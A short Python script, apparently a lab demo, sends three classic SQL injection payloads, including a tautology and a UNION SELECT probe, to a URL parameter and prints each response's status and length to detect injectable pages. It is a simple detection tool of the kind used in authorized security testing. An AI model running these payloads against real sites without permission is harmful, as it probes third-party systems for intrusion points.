#!/usr/bin/env python3
# Demo: safe SQLi detection technique for authorized lab apps only.
import requests, sys
def test_sqli(url, param='id'):
    payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' UNION SELECT NULL-- "]
    for p in payloads:
        try:
            r = requests.get(url, params={param: p}, timeout=6)
            print('Payload:', p, 'Status:', r.status_code, 'Length:', len(r.text))
        except Exception as e:
            print('Error:', e)
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python3 sql_injection_demo.py http://target/page.php')
    else:
        test_sqli(sys.argv[1])
